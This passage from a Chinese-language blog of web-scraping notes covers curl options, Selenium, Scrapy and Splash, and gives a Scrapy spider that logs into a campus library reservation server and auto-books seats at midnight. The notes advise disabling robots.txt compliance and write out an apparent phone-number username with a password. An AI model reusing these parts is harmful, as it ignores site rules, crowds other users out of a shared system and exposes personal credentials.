class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">def from_response(cls, response, <span class="hljs-attribute">formname</span>=None, <span class="hljs-attribute">formid</span>=None, <span class="hljs-attribute">formnumber</span>=0, <span class="hljs-attribute">formdata</span>=None,<br>                  <span class="hljs-attribute">clickdata</span>=None, <span class="hljs-attribute">dont_click</span>=<span class="hljs-literal">False</span>, <span class="hljs-attribute">formxpath</span>=None, <span class="hljs-attribute">formcss</span>=None, **kwargs):<br></code></pre></td></tr></table></figure><h3 id="使用curl来爬取"><a href="#使用curl来爬取" class="headerlink" title="使用curl来爬取"></a>使用curl来爬取</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs stylus">#爬<br>curl &lt;url&gt;爬取网址<br><br>#参<span class="hljs-number">1</span>(爬取到指定文件夹)<br>curl -o <span class="hljs-selector-attr">[文件名]</span> &lt;url&gt;爬网<br><br>#参<span class="hljs-number">2</span> 重定向<br>curl -L &lt;url&gt;<br><br>#参<span class="hljs-number">3</span> 显示头信息(大写I只显示头信息,不显示其他信息,大写好像都是这个规律)<br>curl -<span class="hljs-selector-tag">i</span> &lt;url&gt;<br><br>#参<span class="hljs-number">4</span> 输出http通信过程<br>curl -v &lt;url&gt;<br><br>#参<span class="hljs-number">5</span> 输出更详细<br>curl <span class="hljs-attr">--trace</span> output<span class="hljs-selector-class">.txt</span> www<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span><br><br>#参<span class="hljs-number">6</span>-X后加请求方式 post传递表达用<span class="hljs-attr">--data</span>+表单的形式<br>curl -X POST <span class="hljs-attr">--data</span> <span class="hljs-string">&quot;data=xxx&quot;</span> &lt;url&gt;<br><br>#参<span class="hljs-number">7</span>上传文件<br>假设表单为<br>&lt;from method=<span class="hljs-string">&quot;post&quot;</span> enctype=<span class="hljs-string">&#x27;multiparty/form-data&#x27;</span> action=<span class="hljs-string">&quot;upload.cgi&quot;</span>&gt;<br>&lt;<span class="hljs-selector-tag">input</span> type=file name=upload&gt;<br>&lt;<span class="hljs-selector-tag">input</span> type=submit name=press value=<span class="hljs-string">&quot;ok&quot;</span>&gt;<br>&lt;/form&gt;<br>curl -<span class="hljs-selector-tag">form</span> upload=@localfilename <span class="hljs-attr">--form</span> press=OK <span class="hljs-selector-attr">[url]</span><br><br>#参<span class="hljs-number">8</span>表示从何处跳转来的<br>curl <span class="hljs-attr">--referer</span> &lt;url1&gt; &lt;url2&gt;<br><br>#参<span class="hljs-number">9</span>添加userAgent<br>curl <span class="hljs-attr">--user-agent</span> <span class="hljs-string">&quot;[userAgent]&quot;</span> <span class="hljs-selector-attr">[url]</span><br><br>#参<span class="hljs-number">10</span><br>curl <span class="hljs-attr">--cookie</span> <span class="hljs-string">&quot;name=xxx&quot;</span> <span class="hljs-selector-attr">[url]</span><br>扩展:<br>curl -c 本地文件 <span class="hljs-selector-attr">[url]</span> 将cookie保存到本地文件<br>curl -d 本地文件 <span class="hljs-selector-attr">[url]</span> 使用本地文件作为cookie信息,进行后续请求<br>#参<span class="hljs-number">11</span>添加请求头<br>curl <span class="hljs-attr">--header</span> <span class="hljs-selector-attr">[url]</span><br>#参<span class="hljs-number">12</span>登录认证<br>curl <span class="hljs-attr">--user</span> name:password <span class="hljs-selector-attr">[url]</span><br><br></code></pre></td></tr></table></figure><h2 id="selenium"><a href="#selenium" class="headerlink" title="selenium"></a>selenium</h2><p>下载selenium用pip</p><p>chrome驱动<a href="http://chromedriver.storage.googleapis.com/index.html">http://chromedriver.storage.googleapis.com/index.html</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver<br><span class="hljs-keyword">from</span> selenium.webdriver.common.keys <span class="hljs-keyword">import</span> Keys<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-comment">##########################################</span><br>    <span class="hljs-comment">#设置无头浏览器</span><br>    option = webdriver.ChromeOptions()<br>    option.add_argument(<span class="hljs-string">&#x27;--headless&#x27;</span>)<br>    broswer = webdriver.Chrome(options=option)<br>    <span class="hljs-comment">##########################################</span><br>    <span class="hljs-comment"># broswer = webdriver.Chrome()</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-number">1</span>)<br>    <span class="hljs-comment">#请求网页</span><br>    broswer.get(<span class="hljs-string">&quot;http://www.baidu.com&quot;</span>)<span class="hljs-comment">#当网页的load加载完毕才执行用waits来确定网页是否完全加载完毕</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-number">2</span>)<br>    <span class="hljs-built_in">print</span>(broswer.get_cookies())<br><span class="hljs-comment">#关闭一个标签</span><br>    broswer.close()<br>    <span class="hljs-comment">#关闭浏览器</span><br>    broswer.quit()<br>    <br></code></pre></td></tr></table></figure><p>1.拖动</p><p>​element &#x3D; driver.find_element_by_name(“source”)</p><p>​target &#x3D; driver.find_element_by_name(“target”)</p><p>​from selenium.webdriver import ActionChains</p><p>​action_chains &#x3D; ActionChains(element)</p><p>​action_chains.drag_and_drop(element,target).perform()</p><p>2.切换窗口</p><p>​driver.switch_to_window(“windowName”)</p><p>​windowName可以从网页中获取,或者用driver.window_handle来迭代打开的窗口</p><p>​<strong>driver.switch_to_window更多的用法上网查吧</strong></p><p>3.定位</p><p>​一般用XPath</p><p>4.等待事件</p><ul><li><p>显示</p><ul><li>&#96;&#96;&#96;python<br>#默认ExpectedConditions每500毫秒一次对网页检查,如果找到了id为about的元素就停止检查交出控制权,如果超出了10秒还没有检查到就强行结束<br>#更多ExpectedConditions用法看<a href="https://blog.csdn.net/weixin_42575593/article/details/83304005">https://blog.csdn.net/weixin_42575593/article/details/83304005</a><br>from selenium import webdriver<br>from selenium.webdriver.common.by import By<br>from selenium.webdriver.support.ui import WebDriverWait<br>from selenium.webdriver.support import expected_conditions as ES<br>broswer &#x3D; webdriver.Chrome()<br>print(1)<br>broswer.get(“<a href="http://www.baidu.com&quot;/">http://www.baidu.com&quot;</a>)<br>try:<br>element &#x3D; WebDriverWait(broswer,10).until(ES.presence_of_all_elements_located((By.ID,”about”)))<br>finally:<br>pass<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>- 隐式<br><br>  - ```python<br>    #虽然不推荐这么设置但是真好用<br>    drive.implicitly_wait(<span class="hljs-number">10</span>)<br>    k = drive.find_element_by_xpath(<span class="hljs-string">&quot;//div[@id=&#x27;content_left&#x27;]//a&quot;</span>)<br></code></pre></td></tr></table></figure></li></ul></li></ul><p>5.行为链</p><p>​拖动就属于行为链、完成一些键盘鼠标的交互效果。</p><p>​详情请看网址<a href="https://www.kancloud.cn/sallymuyi/selenium/1384612">https://www.kancloud.cn/sallymuyi/selenium/1384612</a></p><p>6.Cookies</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">drive.get_cookies()<br>drive.get_cookie()<br>drive.add_cookie()<br>drive.delete_all_cookies()<br>drive.delete_cookie()<br></code></pre></td></tr></table></figure><p>用selenium来接入scrapy只需要在下载中间件中process_request函数设立request请求方式并返回一个response对象如:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">driver = webdriver.Chrome()<br>driver.get(request.url)<br>html = driver.page_source<br><span class="hljs-keyword">return</span> HtmlResponse(url=request.url,body=html.encode(),request=request)<br></code></pre></td></tr></table></figure><h2 id="关于splash的一些问题"><a href="#关于splash的一些问题" class="headerlink" title="关于splash的一些问题"></a>关于splash的一些问题</h2><p>有可能网上教安装完后默认开启端口是localhost:8050端口但是我们需要在docker虚拟机上用</p><blockquote><p>docker-machine ip default</p></blockquote><p>进行查看docker运行的IP查看</p><blockquote><p><a href="http://192.168.99.100:8050/render.json?url=http://www.taobao.com">http://192.168.99.100:8050/render.json?url=http://www.taobao.com</a></p></blockquote><p>测试判断是否启动成功(url后面必须加http:&#x2F;&#x2F;)</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><blockquote><p>报错</p><p>​EOL while scanning string literal</p><p>解决乱码问题</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment">#setting文件中添加这行代码</span><br><span class="hljs-attr">FEED_EXPORT_ENCODING</span> = <span class="hljs-string">&#x27;utf-8&#x27;</span><br></code></pre></td></tr></table></figure><p>修改PIP源地址</p><p>​<strong>pip install -i <a href="https://pypi.tuna.tsinghua.edu.cn/simple">https://pypi.tuna.tsinghua.edu.cn/simple</a> pandas</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">text = response<span class="hljs-selector-class">.xpath</span>(<span class="hljs-string">&quot;//form[@id = &#x27;frmLogin&#x27;]//input[@type=&#x27;hidden&#x27;]/@value&quot;</span>)<br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> text:<br> <span class="hljs-built_in">print</span>(<span class="hljs-selector-tag">i</span><span class="hljs-selector-class">.extract</span>())<br>获取xpath提取的内容<br></code></pre></td></tr></table></figure></blockquote><h1 id="处理Excel和CSV以后再看吧现在用不到"><a href="#处理Excel和CSV以后再看吧现在用不到" class="headerlink" title="处理Excel和CSV以后再看吧现在用不到"></a>处理Excel和CSV以后再看吧现在用不到</h1><h1 id="scrapy心得（项目心得）"><a href="#scrapy心得（项目心得）" class="headerlink" title="scrapy心得（项目心得）"></a>scrapy心得（项目心得）</h1><p>1.设置cookies</p><p>​我的做法是通过middlewares来提前获取一个cookies然后重复使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">process_request</span>(<span class="hljs-params">self, request, spider</span>):<br>    request.cookies = self.cookies<br>    <span class="hljs-keyword">if</span> (request.cookies == &#123;&#125; <span class="hljs-keyword">and</span> request.url!=<span class="hljs-string">&quot;http://210.44.64.139/robots.txt&quot;</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;--------------------cookies-----------------------&quot;</span>)<br>        <span class="hljs-built_in">print</span>(request.cookies)<br>        <br>        session = requests.session()<br>        response = session.get(request.url)<br>        <span class="hljs-comment">#将requests的cookies转换为dict类</span><br>        self.cookies = request.cookies = response.cookies.get_dict()<br>        images = session.get(<span class="hljs-string">&quot;http://210.44.64.139/seat/captcha.php&quot;</span>)<br>        <span class="hljs-comment">#写入二维码</span><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./ver.png&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> file:<br>            file.write(images.content)<br>        a = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入验证码&quot;</span>)<br>        data = &#123;<br>            <span class="hljs-string">&quot;postdata[username]&quot;</span>:request.meta[<span class="hljs-string">&#x27;name&#x27;</span>],<br>            <span class="hljs-string">&quot;postdata[password]&quot;</span>:request.meta[<span class="hljs-string">&#x27;password&#x27;</span>],<br>            <span class="hljs-string">&quot;postdata[captcha]&quot;</span>: a<br>        &#125;<br>        req_header = &#123;<br>            <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36&#x27;</span>,<br>        &#125;<br>        <span class="hljs-comment">#进行登录</span><br>        response = session.post(url=<span class="hljs-string">&quot;http://210.44.64.139/seat/seatOrderAction.php?action=normalLogin&quot;</span>,data=data,cookies = response.cookies,headers=req_header)<br>        response.encoding = <span class="hljs-string">&quot;utf-8&quot;</span><br>        <span class="hljs-comment">#返回登录结果</span><br>        <span class="hljs-built_in">print</span>(response.text)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br></code></pre></td></tr></table></figure><p>2.ROBOTSTXT_OBEY&#x3D;False用来屏蔽robots 协议，这样就不会爬取robots</p><p>3.from urllib.request import urlretrieve用这个类来下载图片，超好用</p><p>4.通过py代码来开启scrapy</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> scrapy <span class="hljs-keyword">import</span> cmdline<br>cmdline.execute([<span class="hljs-string">&quot;scrapy&quot;</span>, <span class="hljs-string">&quot;crawl&quot;</span>,<span class="hljs-string">&quot;-a&quot;</span>,<span class="hljs-string">&quot;username=18026240010&quot;</span>,<span class="hljs-string">&quot;-a&quot;</span>,<span class="hljs-string">&quot;password=000000&quot;</span>,<span class="hljs-string">&quot;wfu&quot;</span>])<br></code></pre></td></tr></table></figure><p>5.与mysql数据库链接</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pymysql<br><span class="hljs-keyword">from</span> .settings <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">GetsetPipeline</span>:<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>    self.connect = pymysql.connect(host=MYSQL_HOST,<br>                                   user=MYSQL_USER,<br>                                   password=MYSQL_PASSWD,<br>                                   database=MYSQL_DBNAME,<br>                                   charset=<span class="hljs-string">&#x27;utf8&#x27;</span>,<br>                                   use_unicode=<span class="hljs-literal">True</span>,<br>                                   port=<span class="hljs-number">3306</span>)<br>    self.cursor = self.connect.cursor()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">process_item</span>(<span class="hljs-params">self, item, spider</span>):<br>    <span class="hljs-built_in">print</span>(self.cursor.execute(<span class="hljs-string">&quot;select * from seating;&quot;</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;---------------------------------Pipeline-----------------------------------------&quot;</span>)<br>    self.cursor.execute(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        insert into seating(area,seat,seatId) value (%s,%s,%s );</span><br><span class="hljs-string">    &quot;&quot;&quot;</span>,(item[<span class="hljs-string">&#x27;area&#x27;</span>],item[<span class="hljs-string">&#x27;set&#x27;</span>],item[<span class="hljs-string">&#x27;setId&#x27;</span>]))<br>    self.connect.commit()<br>    <span class="hljs-keyword">return</span> item<br></code></pre></td></tr></table></figure><p>6.spider主体代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs python">    <span class="hljs-comment">#用来获取命令行的输入</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,username=<span class="hljs-literal">None</span>,password = <span class="hljs-literal">None</span>,*args, **kwargs</span>):<br>        self.username = username<br>        self.password = password<br>        <span class="hljs-built_in">print</span>(username+<span class="hljs-string">&quot;:&quot;</span>+password)<br>    <span class="hljs-comment">#建立与mysql的链接</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">connect</span>(<span class="hljs-params">self</span>):<br>        self.con = pymysql.connect(host=MYSQL_HOST,<br>                                       user=MYSQL_USER,<br>                                       password=MYSQL_PASSWD,<br>                                       database=MYSQL_DBNAME,<br>                                       charset=<span class="hljs-string">&#x27;utf8&#x27;</span>,<br>                                       use_unicode=<span class="hljs-literal">True</span>,<br>                                       port=<span class="hljs-number">3306</span>)<br>        self.cursor = self.con.cursor()<br><span class="hljs-comment">#获取MySQL数据库里面可以爬取的数据与显示要爬取区域的信息</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">Options</span>(<span class="hljs-params">self</span>):<br>        self.connect()<br>        sql = <span class="hljs-string">&quot;select distinct area from seating;&quot;</span><br>        self.cursor.execute(sql)<br>        result = self.cursor.fetchall()<br>        No = <span class="hljs-number">1</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> result:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;%d-%s&quot;</span>%(No,i[<span class="hljs-number">0</span>]))<br>            No+=<span class="hljs-number">1</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            occupy = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;please enter the floor you want to occupy:&quot;</span>))<br>            <span class="hljs-keyword">if</span> occupy&gt;<span class="hljs-number">0</span> <span class="hljs-keyword">and</span> occupy&lt;<span class="hljs-built_in">len</span>(result):<br>                result = result[occupy-<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]<br>                <span class="hljs-keyword">return</span> result<br><span class="hljs-comment">#设计倒计时</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">timer</span>(<span class="hljs-params">self</span>):<br>        now = datetime.datetime.now()<br>        t_now = now + timedelta(days=<span class="hljs-number">1</span>)<br>        t_now = datetime.datetime(t_now.year, t_now.month, t_now.day, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<br>        count = t_now - now<br>        tt = count.seconds<br>        <span class="hljs-keyword">while</span> tt &gt; <span class="hljs-number">0</span>:<br>            now = datetime.datetime.now()<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\r在 <span class="hljs-subst">&#123;count&#125;</span> 秒后开始&quot;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)<br>            <span class="hljs-comment">#####################</span><br>            time.sleep(<span class="hljs-number">1</span>)<br>            <span class="hljs-comment">#####################</span><br>            count = t_now - now<br>            tt = count.seconds<br>    <span class="hljs-comment">#发送一个请求用来获取cookies</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">start_requests</span>(<span class="hljs-params">self</span>):<br><br>        login_info = &#123;<span class="hljs-string">&quot;name&quot;</span>:self.username,<span class="hljs-string">&quot;password&quot;</span>:self.password&#125;<br>        <span class="hljs-keyword">yield</span> Request(url=<span class="hljs-string">&quot;http://210.44.64.139/seat&quot;</span>,callback=self.parse,meta=login_info)<br>        <br><span class="hljs-comment">#正式的抢座程序</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">parse</span>(<span class="hljs-params">self, response</span>):<br>        <span class="hljs-comment"># print(response.text)</span><br>        result = self.Options()<br>        sql = <span class="hljs-string">&quot;select * from seating where area = &#x27;%s&#x27;;&quot;</span> % (result)<br>        self.cursor.execute(sql)<br>        result = self.cursor.fetchall()<br>        <span class="hljs-built_in">list</span> = random.sample(result, k=<span class="hljs-number">3</span>)<br>        now = datetime.datetime.now()<br>        t_now = now + timedelta(days=<span class="hljs-number">1</span>)<br>        time.sleep(<span class="hljs-number">120</span>)<br>        <span class="hljs-keyword">for</span> jj <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>:<br>            <span class="hljs-comment">#循环发送三个抢座请求</span><br>            fordata = &#123;<span class="hljs-string">&quot;seat_id&quot;</span>: jj[<span class="hljs-number">2</span>],<br>                       <span class="hljs-string">&quot;order_date&quot;</span>: <span class="hljs-string">&quot;&#123;0:04d&#125;-&#123;1:02d&#125;-&#123;2:02d&#125;&quot;</span>.<span class="hljs-built_in">format</span>(t_now.year, t_now.month, t_now.day)&#125;<br>            <span class="hljs-keyword">yield</span> FormRequest(url=<span class="hljs-string">&quot;http://210.44.64.139/seat/seatOrderAction.php?action=addOrderSeat&quot;</span>,<br>                              callback=self.get_result,<br>                              formdata=fordata)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_result</span>(<span class="hljs-params">self,response</span>):<br>        <span class="hljs-built_in">print</span>(response.text)<br><span class="hljs-comment">#关闭连接</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">close</span>(<span class="hljs-params">spider, reason</span>):<br>        spider.cursor.close()<br>        spider.con.close()<br></code></pre></td></tr></table></figure><h2 id="打包程序"><a href="#打包程序" class="headerlink" title="打包程序"></a>打包程序</h2><p>安装pyinstaller</p><p>然后用命令行在要打包的程序的目录下输入pyinstaller -F &lt;程序名例如counter.py&gt;</p><h1 id="pipelines"><a href="#pipelines" class="headerlink" title="pipelines"></a>pipelines</h1><p>用来存储传递来的数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Define your item pipelines here</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Don&#x27;t forget to add your pipeline to the ITEM_PIPELINES setting</span><br><span class="hljs-comment"># See: https://docs.scrapy.org/en/latest/topics/item-pipeline.html</span><br><br><br><span class="hljs-comment"># useful for handling different item types with a single interface</span><br><span class="hljs-keyword">from</span> itemadapter <span class="hljs-keyword">import</span> ItemAdapter<br><span class="hljs-keyword">import</span> pymysql<br><span class="hljs-keyword">from</span> .settings <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> .spiders <span class="hljs-keyword">import</span> school_info<br><span class="hljs-keyword">from</span> .spiders <span class="hljs-keyword">import</span> getCodeSpecialty<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SpiderdataPipeline</span>:<br><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">open_spider</span>(<span class="hljs-params">self,spider</span>):<br>        self.con = pymysql.connect(host=MYSQL_HOST,<br>                                       user=MYSQL_USER,<br>                                       password=MYSQL_PASSWD,<br>                                       database=MYSQL_DBNAME,<br>                                       charset=<span class="hljs-string">&#x27;utf8&#x27;</span>,<br>                                       use_unicode=<span class="hljs-literal">True</span>,<br>                                       port=<span class="hljs-number">3306</span>)<br>        self.cursor = self.con.cursor()<br><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">process_item</span>(<span class="hljs-params">self, item, spider</span>):<br>        <span class="hljs-built_in">print</span>(item)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(spider,school_info.SchoolInfoSpider):<br><br>            values = (item[<span class="hljs-string">&#x27;schoolName&#x27;</span>]<br>                    , item[<span class="hljs-string">&#x27;schoolBelong&#x27;</span>]<br>                    , item[<span class="hljs-string">&#x27;levelName&#x27;</span>]<br>                    , item[<span class="hljs-string">&#x27;typeName&#x27;</span>]<br>                    , item[<span class="hljs-string">&#x27;dualClassName&#x27;</span>]<br>                    , item[<span class="hljs-string">&#x27;address&#x27;</span>]<br>                    , item[<span class="hljs-string">&#x27;content&#x27;</span>]<br>                    , item[<span class="hljs-string">&#x27;isSeal&#x27;</span>]<br>                    , item[<span class="hljs-string">&#x27;numSubject&#x27;</span>]<br>                    , item[<span class="hljs-string">&#x27;numMaster&#x27;</span>]<br>                    , item[<span class="hljs-string">&#x27;numDoctor&#x27;</span>])<br><br>            sql = <span class="hljs-string">&quot;INSERT INTO `ceedb`.`school_info` (`school_name`,`school_belong`,`levelName`,`typeName`,`dualClassName`,`address`,`content`,`isSeal`,`numSubject`,`numMaster`,`numDoctor`)VALUES(%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s);&quot;</span><br>            <span class="hljs-keyword">try</span>:<br>                self.cursor.execute(sql, values)<br>                self.con.commit()<br><br>            <span class="hljs-keyword">except</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;insert failed&quot;</span>)<br>                <span class="hljs-built_in">print</span>(item)<br><br>            <span class="hljs-keyword">return</span> item<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(spider,getCodeSpecialty.GetcodespecialtySpider):<br>            values = (item[<span class="hljs-string">&#x27;name&#x27;</span>],item[<span 